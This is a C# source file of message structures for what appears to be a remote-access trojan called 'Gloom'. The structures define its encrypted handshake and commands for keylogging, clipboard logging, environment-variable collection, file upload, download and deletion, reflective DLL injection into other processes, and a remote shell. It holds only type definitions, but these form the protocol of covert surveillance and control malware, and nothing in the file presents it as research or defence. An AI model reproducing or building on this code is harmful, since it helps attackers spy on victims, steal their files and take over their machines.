namespace Gloom
{
	public static class OpStructs
	{
		#region Handshake
		[Serializable]
		public struct ClientHello // SSL Client Hello + Client Key Exchange
		{
			public string Name { get; set; }
			public byte[] ClientRandom { get; set; }
			public byte[] DHParameter { get; set; }
			public int KDFIterations { get; set; }
			public int KDFMemorySize { get; set; }
			public int KDFParallelism { get; set; }
		}

		[Serializable]
		public struct ServerHello // SSL Server Hello + Server Key Exchange
		{
			public byte[] ServerRandom { get; set; }
			public byte[] DHParameter { get; set; }
		}
		#endregion

		#region Global
		#endregion

		#region KeyLogger
		[Serializable]
		public struct KeyLoggerSettingRequest
		{
			public int Mode { get; set; }
			public int SaveInterval { get; set; }
		}

		[Serializable]
		public struct KeyLogRequest
		{
			public int LogCount { get; set; }
		}

		[Serializable]
		public struct KeyLogResponse
		{
			public int LogIndex { get; set; }
			public byte[] CompressedLog { get; set; }
		}
		#endregion

		#region ClipboardLogger
		[Serializable]
		public struct ClipboardLoggerRequest
		{
		}

		[Serializable]
		public struct ClipboardLoggerStateResponse
		{
			public bool Enabled { get; set; }
		}

		[Serializable]
		public struct ClipboardLogResponse
		{
			public List<ClipboardEntry> Entries { get; set; }
		}

		public struct ClipboardEntry
		{
			public DateTime TimeStamp;
			public string Text;
		}
		#endregion

		#region ScreenCapturer
		#endregion

		#region SelfUpdater
		#endregion

		#region InfoCollector
		[Serializable]
		public struct EnvVarsRequest
		{
		}

		[Serializable]
		public struct EnvVarsResponse
		{
			public List<(string, string)> Map { get; set; }
		}
		#endregion

		#region FileIO
		[Serializable]
		public struct UploadFilePreRequest
		{
			public Guid Sid { get; set; }
			public string Destination { get; set; }
			public long TotalChunkCount { get; set; }
		}

		[Serializable]
		public struct UploadFilePostRequest
		{
			public Guid Sid { get; set; }
			public string Destination { get; set; }
			public int BufferSize { get; set; }
		}

		[Serializable]
		public struct UploadFileChunkRequest
		{
			public Guid Sid { get; set; }
			public long ChunkIndex { get; set; }
			public byte[] Data { get; set; }
		}

		[Serializable]
		public struct UploadFileResponse
		{
			public Guid Sid { get; set; }
			public int ErrorCode { get; set; }
			public byte[] Sha512Hash { get; set; }
		}

		[Serializable]
		public struct DownloadFileRequest
		{
			public Guid Sid { get; set; }
			public string Source { get; set; }
			public int BufferSize { get; set; }
		}

		[Serializable]
		public struct DownloadFileChunkResponse
		{
			public Guid Sid { get; set; }
			public long ChunkIndex { get; set; }
			public byte[] Data { get; set; }
		}

		[Serializable]
		public struct DownloadFilePreResponse
		{
			public Guid Sid { get; set; }
			public int ErrorCode { get; set; }
			public long TotalChunkCount { get; set; }
		}

		[Serializable]
		public struct DownloadFilePostResponse
		{
			public Guid Sid { get; set; }
			public int ErrorCode { get; set; }
			public byte[] Sha512Hash { get; set; }
		}
		#endregion

		[Serializable]
		public struct DeleteFileRequest
		{
			public string FilePath { get; set; }
		}

		[Serializable]
		public struct DeleteFileResponse
		{
			public int ErrorCode { get; set; }
		}

		#region DLL Injection
		[Serializable]
		public struct DllInjectionRequest
		{
			public Guid Sid { get; set; }
			public int TargetProcessId;
			public string ReflectiveLoaderProcName;
			public byte[] TheDll;
		}

		[Serializable]
		public struct DllInjectionResponse
		{
			public Guid Sid { get; set; }
			public int ErrorCode { get; set; }
			public int GetLastError { get; set; }
		}
		#endregion

		#region Shell
		[Serializable]
		public struct ShellOpenRequest
		{
			public Guid Sid { get; set; }
			public string ShellFileName { get; set; }
			public string ShellArguments { get; set; }
		}

		[Serializable]
		public struct ShellInRequest
		{
			public Guid Sid { get; set; }
			public string Message { get; set; }
		}

		[Serializable]
		public struct ShellOutResponse
		{
			public Guid Sid { get; set; }
			public string Message { get; set; }
		}

		[Serializable]
		public struct ShellErrResponse
		{
			public Guid Sid { get; set; }
			public string Message { get; set; }
		}

		[Serializable]
		public struct ShellExitResponse
		{
			public Guid Sid { get; set; }
			public int ExitCode { get; set; }
		}
		#endregion
	}
}